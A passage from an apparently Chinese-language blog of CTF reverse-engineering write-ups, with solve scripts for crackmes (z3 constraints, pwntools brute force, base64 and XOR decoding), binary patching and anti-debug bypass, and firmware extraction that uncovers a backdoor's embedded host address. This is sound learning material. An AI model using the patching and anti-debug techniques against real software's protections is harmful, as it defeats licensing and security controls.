20]-l[2]-l[35]-l[26]+l[27]==-28&amp;&amp;l[11]+l[18]-l[26]+l[15]-l[14]-l[33]+l[7]-l[23]-l[25]+l[0]-l[6]-l[21]-l[16]+l[17]-l[19]-l[28]-l[38]-l[37]+l[9]+l[20]-l[8]-l[3]+l[22]-l[35]-l[10]-l[31]-l[2]+l[41]-l[1]-l[4]+l[24]-l[34]+l[39]+l[40]+l[32]-l[5]+l[36]-l[27]==-529&amp;&amp;l[38]+l[8]+l[36]+l[35]-l[23]-l[34]+l[13]-l[4]-l[27]-l[24]+l[26]+l[31]-l[30]-l[5]-l[40]+l[28]-l[11]-l[2]-l[39]+l[15]+l[10]-l[17]+l[3]+l[19]+l[22]+l[33]+l[0]+l[37]+l[16]-l[9]-l[32]+l[25]-l[21]-l[12]+l[6]-l[41]+l[20]-l[18]==-12&amp;&amp;l[6]-l[30]-l[20]-l[27]-l[14]-l[39]+l[41]-l[33]-l[0]+l[25]-l[32]-l[3]+l[26]-l[12]+l[8]-l[35]-l[24]+l[15]+l[9]-l[4]+l[13]+l[36]+l[34]+l[1]-l[28]-l[21]+l[18]+l[23]+l[29]-l[10]-l[38]+l[22]+l[37]+l[5]+l[19]+l[7]+l[16]-l[31]==+(!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[+!+[]]) 可以看到等式最后有个数字没有解出来 我们放到网站中解就行了 http://codertab.com/JsUnFuck 是个81，关于等式，我们使用z3 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from z3 import *l0,l1,l2,l3,l4,l5,l6,l7,l8,l9,l10,l11,l12,l13,l14,l15,l16,l17,l18,l19,l20,l21,l22,l23,l24,l25,l26,l27,l28,l29,l30,l31,l32,l33,l34,l35,l36,l37,l38,l39,l40,l41 \\= Ints('l0 l1 l2 l3 l4 l5 l6 l7 l8 l9 l10 l11 l12 l13 l14 l15 l16 l17 l18 l19 l20 l21 l22 l23 l24 l25 l26 l27 l28 l29 l30 l31 l32 l33 l34 l35 l36 l37 l38 l39 l40 l41')x = Solver()x.add(l40+l35+l34-l0-l15-l37+l7+l6-l26+l20+l19+l8-l17-l14-l38+l1-l9+l22+l41+l3-l29-l36-l25+l5+l32-l16+l12-l24+l30+l39+l10+l2+l27+l28+l21+l33-l18+l4==861)x.add(l31+l26+l11-l33+l27-l3+l12+l30+l1+l32-l16+l7+l10-l25+l38-l41-l14-l19+l29+l36-l9-l28-l6-l0-l22-l18+l20-l37+l4-l24+l34-l21-l39-l23-l8-l40+l15-l35==-448)x.add(l26+l14+l15+l9+l13+l30-l11+l18+l23+l7+l3+l12+l25-l24-l39-l35-l20+l40-l8+l10-l5-l33-l31+l32+l19+l21-l6+l1+l16+l17+l29+l22-l4-l36+l41+l38+l2+l0==1244)x.add(l5+l22+l15+l2-l28-l10-l3-l13-l18+l30-l9+l32+l19+l34+l23-l17+l16-l7+l24-l39+l8-l12-l40-l25+l37-l35+l11-l14+l20-l27+l4-l33-l21+l31-l6+l1+l38-l29==-39)x.add(l41-l29+l23-l4+l20-l33+l35+l3-l19-l21+l11+l26-l24-l17+l37+l1+l16-l0-l13+l7+l10+l14+l22+l39-l40+l34-l38+l32+l25-l2+l15+l6+l28-l8-l5-l31-l30-l27==485)x.add(l13+l19+l21-l2-l33-l0+l39+l31-l23-l41+l38-l29+l36+l24-l20-l9-l32+l37-l35+l40+l7-l26+l15-l10-l6-l16-l4-l5-l30-l14-l22-l25-l34-l17-l11-l27+l1-l28==-1068)x.add(l32+l0+l9+l14+l11+l18-l13+l24-l2-l15+l19-l21+l1+l39-l8-l3+l33+l6-l5-l35-l28+l25-l41+l22-l17+l10+l40+l34+l27-l20+l23+l31-l16+l7+l12-l30+l29-l4==939)x.add(l19+l11+l20-l16+l40+l25+l1-l31+l28-l23+l14-l9-l27+l35+l39-l37-l8-l22+l5-l6+l0-l32+l24+l33+l29+l38+l15-l2+l30+l7+l12-l3-l17+l34+l41-l4-l13-l26==413)x.add(l22+l4-l9+l34+l35+l17+l3-l24+l38-l5-l41-l31-l0-l25+l33+l15-l1-l10+l16-l29-l12+l26-l39-l21-l18-l6-l40-l13+l8+l37+l19+l14+l32+l28-l11+l23+l36+l7==117)x.add(l32+l16+l3+l11+l34-l31+l14+l25+l1-l30-l33-l40-l4-l29+l18-l27+l13-l19-l12+l23-l39-l41-l8+l22-l5-l38-l9-l37+l17-l36+l24-l21+l2-l26+l20-l7+l35-l0==-313)x.add(l40-l1+l5+l7+l33+l29+l12+l38-l31+l2+l14-l35-l8-l24-l39-l9-l28+l23-l17-l22-l26+l32-l11+l4-l36+l10+l20-l18-l16+l6-l0+l3-l30+l37-l19+l21+l25-l15==-42)x.add(l21+l26-l17-l25+l27-l22-l39-l23-l15-l20-l32+l12+l3-l6+l28+l31+l13-l16-l37-l30-l5+l41+l29+l36+l1+l11+l24+l18-l40+l19-l35+l2-l38+l14-l9+l4+l0-l33==289)x.add(l29+l31+l32-l17-l7+l34+l2+l14+l23-l4+l3+l35-l33-l9-l20-l37+l24-l27+l36+l15-l18-l0+l12+l11-l38+l6+l22+l39-l25-l10-l19-l1+l13-l41+l30-l16+l28-l26==-117)x.add(l5+l37-l39+l0-l27+l12+l41-l22+l8-l16-l38+l9+l15-l35-l29+l18+l6-l25-l28+l36+l34+l32-l14-l1+l20+l40-l19-l4-l7+l26+l30-l10+l13-l21+l2-l23-l3-l33==-252)x.add(l29+l10-l41-l9+l12-l28+l11+l40-l27-l8+l32-l25-l23+l39-l1-l36-l15+l33-l20+l18+l22-l3+l6-l34-l21+l19+l26+l13-l4+l7-l37+l38-l2-l30-l0-l35+l5+l17==-183)x.add(l6-l8-l20+l34-l33-l25-l4+l3+l17-l13-l15-l40+l1-l30-l14-l28-l35+l38-l22+l2+l24-l29+l5+l9+l37+l23-l18+l19-l21+l11+l36+l41-l7-l32+l10+l26-l0+l31==188)x.add(l3+l6-l41+l10+l39+l37+l1+l8+l21+l24+l29+l12+l27-l38+l11+l23+l28+l33-l31+l14-l5+l32-l17+l40-l34+l20-l22-l16+l19+l2-l36-l7+l18+l15+l26-l0-l4+l35==1036)x.add(l28-l33+l2+l37-l12-l9-l39+l16-l32+l8-l36+l31+l10-l4+l21-l25+l18+l24-l0+l29-l26+l35-l22-l41-l6+l15+l19+l40+l7+l34+l17-l3-l13+l5+l23+l11-l27+l1==328)x.add(l22-l32+l17-l9+l20-l18-l34+l23+l36-l35-l38+l27+l4-l5-l41+l29+l33+l0-l37+l28-l40-l11-l12+l7+l1+l2-l26-l16-l8+l24-l25+l3-l6-l19-l39-l14-l31+l10==-196)x.add(l11+l13+l14-l15-l29-l2+l7+l20+l30-l36-l33-l19+l31+l0-l39-l4-l6+l38+l35-l28+l34-l9-l23-l26+l37-l8-l27+l5-l41+l3+l17+l40-l10+l25+l12-l24+l18+l32==7)x.add(l34-l37-l40+l4-l22-l31-l6+l38+l13-l28+l8+l30-l20-l7-l32+l26+l1-l18+l5+l35-l24-l41+l9-l0-l2-l15-l10+l12-l36+l33-l16-l14-l25-l29-l21+l27+l3-l17==-945)x.add(l12-l30-l8+l20-l2-l36-l25-l0-l19-l28-l7-l11-l33+l4-l23+l10-l41+l39-l32+l27+l18+l15+l34+l13-l40+l29-l6+l37-l14-l16+l38-l26+l17+l31-l22-l35+l5-l1==-480)x.add(l36-l11-l34+l8+l0+l15+l28-l39-l32-l2-l27+l22+l16-l30-l3+l31-l26+l20+l17-l29-l18+l19-l10+l6-l5-l38-l25-l24+l4+l23+l9+l14+l21-l37+l13-l41-l12+l35==-213)x.add(l19-l36-l12+l33-l27-l37-l25+l38+l16-l18+l22-l39+l13-l7-l31-l26+l15-l10-l9-l2-l30-l11+l41-l4+l24+l34+l5+l17+l14+l6+l8-l21-l23+l32-l1-l29-l0+l3==-386)x.add(l0+l7-l28-l38+l19+l31-l5+l24-l3+l33-l12-l29+l32+l1-l34-l9-l25+l26-l8+l4-l10+l40-l15-l11-l27+l36+l14+l41-l35-l13-l17-l21-l18+l39-l2+l20-l23-l22==-349)x.add(l10+l22+l21-l0+l15-l6+l20-l29-l30-l33+l19+l23-l28+l41-l27-l12-l37-l32+l34-l36+l3+l1-l13+l18+l14+l9+l7-l39+l8+l2-l31-l5-l40+l38-l26-l4+l16-l25==98)x.add(l28+l38+l20+l0-l5-l34-l41+l22-l26+l11+l29+l31-l3-l16+l23+l17-l18+l9-l4-l12-l19-l40-l27+l33+l8-l37+l2+l15-l24-l39+l10+l35-l1+l30-l36-l25-l14-l32==-412)x.add(l1-l24-l29+l39+l41+l0+l9-l19+l6-l37-l22+l32+l21+l28+l36+l4-l17+l20-l13-l35-l5+l33-l27-l30+l40+l25-l18+l34-l3-l10-l16-l23-l38+l8-l14-l11-l7+l12==-95)x.add(l2-l24+l31+l0+l9-l6+l7-l1-l22+l8-l23+l40+l20-l38-l11-l14+l18-l36+l15-l4-l41-l12-l34+l32-l35+l17-l21-l10-l29+l39-l16+l27+l26-l3-l5+l13+l25-l28==-379)x.add(l19-l17+l31+l14+l6-l12+l16-l8+l27-l13+l41+l2-l7+l32+l1+l25-l9+l37+l34-l18-l40-l11-l10+l38+l21+l3-l0+l24+l15+l23-l20+l26+l22-l4-l28-l5+l39+l35==861)x.add(l35+l36-l16-l26-l31+l0+l21-l13+l14+l39+l7+l4+l34+l38+l17+l22+l32+l5+l15+l8-l29+l40+l24+l6+l30-l2+l25+l23+l1+l12+l9-l10-l3-l19+l20-l37-l33-l18==1169)x.add(l13+l0-l25-l32-l21-l34-l14-l9-l8-l15-l16+l38-l35-l30-l40-l12+l3-l19+l4-l41+l2-l36+l37+l17-l1+l26-l39-l10-l33+l5-l27-l23-l24-l7+l31-l28-l18+l6==-1236)x.add(l20+l27-l29-l25-l3+l28-l32-l11+l10+l31+l16+l21-l7+l4-l24-l35+l26+l12-l37+l6+l23+l41-l39-l38+l40-l36+l8-l9-l5-l1-l13-l14+l19+l0-l34-l15+l17+l22==-114)x.add(l12-l28-l13-l23-l33+l18+l10+l11+l2-l36+l41-l16+l39+l34+l32+l37-l38+l20+l6+l7+l31+l5+l22-l4-l15-l24+l17-l3+l1-l35-l9+l30+l25-l0-l8-l14+l26+l21==659)x.add(l21-l3+l7-l27+l0-l32-l24-l37+l4-l22+l20-l5-l30-l31-l1+l15+l41+l12+l40+l38-l17-l39+l19-l13+l23+l18-l2+l6-l33-l9+l28+l8-l16-l10-l14+l34+l35-l11==-430)x.add(l11-l23-l9-l19+l17+l38-l36-l22-l10+l27-l14-l4+l5+l31+l2+l0-l16-l8-l28+l3+l40+l25-l33+l13-l32-l35+l26-l20-l41-l30-l12-l7+l37-l39+l15+l18-l29-l21==-513)x.add(l32+l19+l4-l13-l17-l30+l5-l33-l37-l15-l18+l7+l25-l14+l35+l40+l16+l1+l2+l26-l3-l39-l22+l23-l36-l27-l9+l6-l41-l0-l31-l20+l12-l8+l29-l11-l34+l21==-502)x.add(l30-l31-l36+l3+l9-l40-l33+l25+l39-l26+l23-l0-l29-l32-l4+l37+l28+l21+l17+l2+l24+l6+l5+l8+l16+l27+l19+l12+l20+l41-l22+l15-l11+l34-l18-l38+l1-l14==853)x.add(l38-l10+l16+l8+l21-l25+l36-l30+l31-l3+l5-l15+l23-l28+l7+l12-l29+l22-l0-l37-l14-l11+l32+l33-l9+l39+l41-l19-l1+l18-l4-l6+l13+l20-l2-l35-l26+l27==-28)x.add(l11+l18-l26+l15-l14-l33+l7-l23-l25+l0-l6-l21-l16+l17-l19-l28-l38-l37+l9+l20-l8-l3+l22-l35-l10-l31-l2+l41-l1-l4+l24-l34+l39+l40+l32-l5+l36-l27==-529)x.add(l38+l8+l36+l35-l23-l34+l13-l4-l27-l24+l26+l31-l30-l5-l40+l28-l11-l2-l39+l15+l10-l17+l3+l19+l22+l33+l0+l37+l16-l9-l32+l25-l21-l12+l6-l41+l20-l18==-12)x.add(l6-l30-l20-l27-l14-l39+l41-l33-l0+l25-l32-l3+l26-l12+l8-l35-l24+l15+l9-l4+l13+l36+l34+l1-l28-l21+l18+l23+l29-l10-l38+l22+l37+l5+l19+l7+l16-l31==81)print(x.check())print(x.model())l = [0]*42 l[14] = 78l[28] = 95l[16] = 95l[17] = 101l[6] = 95l[30] = 52l[36] = 84l[38] = 95l[40] = 51l[3] = 103l[32] = 121l[11] = 95l[9] = 110l[31] = 83l[0] = 102l[4] = 123l[1] = 108l[41] = 125l[35] = 49l[8] = 48l[19] = 85l[15] = 71l[21] = 84l[18] = 113l[23] = 48l[34] = 87l[7] = 108l[25] = 95l[13] = 48l[33] = 95l[27] = 115l[10] = 103l[2] = 97l[37] = 104l[5] = 65l[20] = 52l[29] = 69l[12] = 49l[24] = 110l[26]= 49l[22] = 105l[39] = 122for i in range(42): print(chr(l[i]),end = '') 把求出来的手动转换成数组，然后输出 用的是之前的方法做的，感觉不太简洁，看网上还有更好的方法 https://www.codetd.com/article/10613214 BUUCTF–[V&amp;N2020 公开赛]CSRe这题首先是去混淆，然后是逆向.NET文件 exeinfo PE可以得知这是个有混淆的文件.NET文件 使用de4dot文件去混淆 然后用dnSpy逆向.net str解出来后是1415 text解出来之后是turn flag{1415turn} [ACTF新生赛2020]SoulLike (elf暴力/pwntools)用ida打开 sub_83A太大了，且篇都是xor,mov,add三个指令， 除了最后的几个字符 参考链接： https://blog.css8.cn/post/1439298.html 原来是配置的问题，需要修改ida /ctg目录下的hexrays.cfg文件中的MAX_FUNCSIZE=64，改成1024 就是将输入的flag，经过3000行的异或后，与最后的几个进行对比 因为最后有提示错误的位数，所以可以试着用爆破的方法…… 这边放上大佬整理的关于pwntools的使用方法： https://seamiloak.github.io/2020/10/16/pwntools%E4%BD%BF%E7%94%A8/ https://blog.csdn.net/hanqdi_/article/details/107164199 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from pwn import *context.log_level = 'debug'table = []for i in range(128): table.append(chr(i))now = &quot;actf{&quot;num = 0while 1: # 长度为12，跳出 if num == 12: break for i in table: io = process('./SoulLike') # 构造flag flag = now + i flag = flag.ljust(17,'@') flag += '}' # success(flag) io.sendline(flag) #一直读到#出现为止 io.recvuntil('#') #10位之后就读两位 if num &lt; 9 : #recv里的1是接受的字节长度，n是数值 n = int(io.recv(1)) else: n = int(io.recv(2)) io.close() # 如果n==num+1，则跳出内层循环 if n == num + 1: now = now + i num = num + 1 breakprint (num)print (now + '}') 太强了！！ 参考链接： http://bubuko.com/infodetail-3671012.html [羊城杯 2020]easyre （base64/凯撒）还是很庆幸自己能独立做出来这一题的 第一个加密是base64加密， 第二个加密是base64加密后的变换， 第三次加密是所有字符向后+3 主要是第二次的加密，不知道到底是怎样转换的， 放到x64dbg中动调了一下 输入时带入了字符串 1string = &quot;abcdefghijklmnopqrstuvwxyz0123456789012&quot; 一次加密后： 1string = &quot;YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXowMTIzNDU2Nzg5MTI=&quot; 二次加密后： 1string = &quot;R1dnd4eXowMTIYWJjZGVmZ2hpazNDU2Nzg5MTI=mtsbW5vcHFyc3&quot; 当时看到加密函数之后人傻了，仔细观察发现只是固定字符段调换了位置，就写出了下面的解法： 1234567891011#a3--&gt;a1def decode2(decode_string): a3 = decode_string a = a3[0:13] b = a3[13:26] c = a3[26:39] d = a3[39:52] a1 = b+d+a+c print(a1) return a1 三次加密后： 1string = &quot;U4gqg7hArzPWLBZMmCJYpC5ksdcQGX5Qcj8PWL=pwveZ8yfKIbf6&quot; 整体还是不难的 1234567891011121314151617181920212223242526272829303132333435363738394041import base64flag_encode_3_times = &quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;#a3--&gt;a1def decode2(decode_string): a3 = decode_string a = a3[0:13] b = a3[13:26] c = a3[26:39] d = a3[39:52]## print(a)## print(b)## print(c)## print(d) a1 = b+d+a+c print(a1) return a1def decode1(string): s = '' print(string) for i in string: m = ord(i) if m &gt;= 65 and m &lt;= 90: s += chr((m-65+23)%26+65) elif m &gt;= 97 and m &lt;= 122: s += chr((m-97+23)%26+97) elif m &gt;= 48 and m &lt;= 57: s += chr((m-48+7)%10+48) else: s += i print(s) return sdecode_string = decode1(flag_encode_3_times)decode2_string = decode2(decode_string)decode3_string = base64.b64decode(decode2_string)print(decode3_string) findKey (花指令+正逆向+MD5)先查个壳 打开运行之后： 发现有花指令： push了两个一样的指令，需要把下面一个去掉才行，nop一次就好 （大佬z1r0说，下面调用了一个系统的strlen函数，在call函数前，应该会push参数到栈中，而突然跳转本来就很奇怪……） 最后选中所有红色的代码，按一下p键，就反汇编成功了 注意，选中的代码一定要包含所有的红色代码，否则会有函数不显示 开始分析代码：（题目是findkey，而且也没有的输入……） 进一下sub_40101E函数，发现关键词8003u，是熟悉的味道：md5 string1经过md5加密之后，与v15异或，需要等于Str的值 经过if判断之后，string1再与v14异或，得到flag 整个程序可以写成以下的伪代码： 123456Str = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;string1 = string1(md5加密)if string1^v15 == Str: flag = string1^v14else: print(&quot;Are you kidding me?&quot;) 逆向思路： –&gt;Str^v15–&gt;string1(md5加密后) –&gt;md5解密还原string1 –&gt;string1与v14异或 –&gt;解出flag 12345Str = &quot;0kk`d1a`55k222k2a776jbfgd`06cjjb&quot;v15 = ord('S')for i in _str: print(chr(ord(i)^v15),end='') 得出string1的值为“123321” v14的值： 1v14 = [0x57,0x5E,0x52,0x54,0x49,0x5F,0x1,0x6D,0x69,0x46,0x2,0x6E,0x5F,0x2,0x6C,0x57,0x5B,0x54,0x4C] string1与v15异或： 12345678v14 = [0x57,0x5E,0x52,0x54,0x49,0x5F,0x1,0x6D,0x69,0x46,0x2,0x6E,0x5F,0x2,0x6C,0x57,0x5B,0x54,0x4C]string1 = ['1','2','3','3','2','1']flag = ''for i in range(len(v14)): flag+=chr(v14[i]^ord(string1[i%6]))print(flag) flag{n0_Zu0_n0_die} [GUET-CTF2019]number_game (动调/二叉树)ida打开函数，是这个样子： 4006D6判断输入字符类型，不满足直接输出wrong 400758这块把我看迷糊了，很像二叉树的前序遍历 后面的400807也是一个打乱顺序的函数 用户输入字符–&gt;两个函数打乱–&gt;满足数独情况 满足数独的情况是 [0，4，2，1，4，2，1，4，3，0] 下午直接找了大佬z1r0来研究这一题。 首先我们想到的是pwndbg来动态调试这一题，当然调试出来了，但是我们带入的是值，不是下标，没有很好的解决这一题，然后我们选择了爆破，只是我们的方法不太好，也就爆破个几个小时就出来了…… 12345678910111213141516171819202122232425262728293031from pwn import *from time import sleepfile_name = './z1r0'context.log_level = 'debug'r = process(file_name)d = ''ppp =['0', '1', '2', '3', '4']for i in ppp: for j in ppp: for k in ppp: for l in ppp: for m in ppp: for n in ppp: for o in ppp: for p in ppp: for q in ppp: for s in ppp: try: r = process(file_name) d = i + j + k + l + m + n + o + p + q + s#d = '11342400' + i + j r.sendline(d) if r.recvline() == b'TQL!\\n': r.interactive() except: print('error') https://www.cnblogs.com/th1r7een/articles/14532420.html 这题最好还是正向来做…… 首先是sub_400758函数构建了一颗二叉树 12345678def test(index,lenth): print(index) if index &gt; lenth: return test(2*index+1,lenth) test(2*(index+1),lenth)test(0,10) 中序遍历后的顺序为：[7,3,8,1,9,4,0,5,2,6] flag{1134240024} 发现IDA还可以动调！！ 需要查看IDA权威指南，IDA动调的话，先放一防，先刷题先…… firmware (路由器逆向/binwalk)关于固件分析的文章： https://www.freebuf.com/articles/ics-articles/262454.html 关于路由器逆向的文章： https://blog.csdn.net/QQ1084283172/article/details/66971242 通常固件文件以bin/zip/LZMA/arj等文件压缩类型封装。 题目给了一个bin文件， 用linux的file命令查看一下，查看是否是二进制镜像文件 通常用binwalk对其进行提取，当然也可以再用binwalk查看一下bin文件的细节信息 用binwalk对bin文件进行提取（e–extract） 1binwalk -e firmware.bin 可以看到提取出了这些文件 我们再通过hexdump或者file确认一下，是否是squashsf文件系统，其地址00包含squashsf的头部特征(hsqs) squashsf后缀文件需要进一步解压，从而获得固件的根文件 可能是binwalk没有安装完全，导致squashfs文件系统损坏 binwalk安装传送门： https://blog.csdn.net/QQ1084283172/article/details/65441110 摸索了很久，发现firmware-mod-kit可以成功解压squashfs文件系统， https://blog.csdn.net/sjt670994562/article/details/98071249 这边放上github的firmware-mod-kit的链接 1git clone https://github.com/mirror/firmware-mod-kit 炸了……搞了很久还是报错kali和ubuntu都试过了…… 再放一放…… –更新– 1sudo apt install firmware-mod-kit 直接用apt安装即可（感谢大佬z1r0的指导！！）默认路径在opt下，在binwalk提取bin文件后的目录下输入下面的指令就行了 1/opt/firmware-mod-kit/trunk/unsquashfs_all.sh ./120200.squashfs 进入squashfs-root目录下的tmp文件夹 file一下，elf文件，ARM类型，但是无法执行 发现有upx壳 1upx -d backdoor 脱壳之后放在ida里面反汇编 1echo.byethost51.com:36667 ​ flag{33a422c45d551ac6e4756f59812a954b} [WMCTF2020]easy_re (perl特性) 查壳后发现没壳，用x64dbg打开 搜索script，并添加断点 向下F8，flag就出来了 WMCTF{I_WAnt_dynam1c_F1ag} 据说是因为perl语言解压call有字符串script， 参考链接：https://blog.csdn.net/Palmer9/article/details/107727922 crackMe (od动调) 用ida32打开后 最外层是一个死循环，要想跳出死循环，需要满足后面的if嵌套， 可以发现if嵌套上面的sub_401090是用来给byte_416050赋值的，还把welcomebeijing这个用户名作为了参数传递到了其中 接着跟进sub_401830，说了一大串之后，v17作为二参进入了sub_401470 要使得v14，也就是sub_40147中的a3等于43924,需要满足a2满足所有的if条件，也就是a2=”dbappsec”，即v17=”dbappsec”，猜测v17是输入的flag经过变换后对比的值 返回sub_401830函数，关于v17的值的代码块也就只有这边了 接下来，我们需要动调，把与byte_416050异或的v16数组求出来 通过明显的地方，可以推算出ida和x32dbg的地址差 光标确定到某一参数，按住tab键可以查看其汇编代码，在伪代码窗口的定义部分可以看到这些参数关于ebp的偏移 加上偏移量就能快速定位到需要执行的函数了 在ida中定位while大循环，然后再dbg中定位，在循环开始和xor处打断点，多按几次F9,记录一下edx低位的值 正向： user输入–&gt;byte_406050–&gt;byte_406050^v16[v5-1]–&gt;v17 逆向： v17–&gt;byte_406050^v17–&gt;v16[v5-1] byte_406050数组，是user传入之后经过一系列变换生成的，我们需要动调的就是byte_406050的值，然后在与已知的v17异或，就是v16的值了，也就是题目要求的flag 我动调之后的结果是[0x7e,0x98,0xc9,0x95,0x10,0x6d,0xf3,0x67] 先放一放…… —-更新—- 在xor的上下有两个反调试指令，所以应该把je改成jmp,动调就行了 调试结果： 1v16 = [0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd] 代码： 12345678v16 = [0x2a,0xd7,0x92,0xe9,0x53,0xe2,0xc4,0xcd]v17 = &quot;dbappsec&quot;flag = []for i in range(8): flag.append(hex(v16[i]^ord(v17[i])).replace(&quot;0x&quot;,&quot;&quot;))for i in flag: print(i,end = '') 关于反调试的可以看看雪大神的这篇文章： https://bbs.pediy.com/thread-225740.htm 参考文章： https://www.songbingjia.com/nginx/show-209658.html https://www.cnblogs.com/pppyyyzzz/p/12546844.html 特殊的base64 (base64换表) 经典的base64换表，“mTy……”是换表之后的加密的字符串，字符串搜索之后可以看到换的base64表。 123456789101112131415import base64string = &quot;mTyqm7wjODkrNLcWl0eqO8K8gc1BPk1GNLgUpI==&quot;new_base = &quot;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0987654321/+&quot;base = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print(len(new_base))print(len(base))flag = base64.b64decode(string.translate(str.maketrans(new_base,base)))print(flag) [网鼎杯 2020 青龙组]singal (vm题/ponce插件)传送门：https://www.52pojie.cn/thread-1176826-1-1.html 查壳，发现没有壳 这个qmemcpy的意思是把unk_403040的456个字符复制到v4中 这个题就是首先是需要去摸清楚指令的调用顺序 进行观察，可以发现，v4 与 a1[v10 + 1]比较 是判断条件，a1是输入的opcode, 而v4来自v5，v5由flag进行运算得到: flag—&gt;v5—-&gt;v4 所以我们要得到v4,然后推v5，再得到flag 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194#include &lt;stdio.h&gt;#include &lt;string.h&gt; unsigned char vmcode[] ={ 0x0A, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x51, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x24, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0B, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x25, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x41, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x22, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x34, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x32, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x72, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x33, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xA7, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x31, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0xF1, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x84, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0xC1, 0xFF, 0xFF, 0xFF, 0x07, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x7A, 0x00, 0x00, 0x00}; int * a = (int *)vmcode;int __cdecl vm_operad(int *opcode, int len_114){ char order[114] = {}; //顺序 即i char flag[100]; // [esp+13h] [ebp-E5h] char v4[100]; // [esp+77h] [ebp-81h] char v5; // [esp+DBh] [ebp-1Dh] int j; // [esp+DCh] [ebp-1Ch] int m; // [esp+E0h] [ebp-18h] int k; // [esp+E4h] [ebp-14h] int n; // [esp+E8h] [ebp-10h] int i; // [esp+ECh] [ebp-Ch] int s = 0; i = 0; n = 0; k = 0; m = 0; j = 0; while (1) { if (i &gt;= len_114) // 成功的地方 break; switch 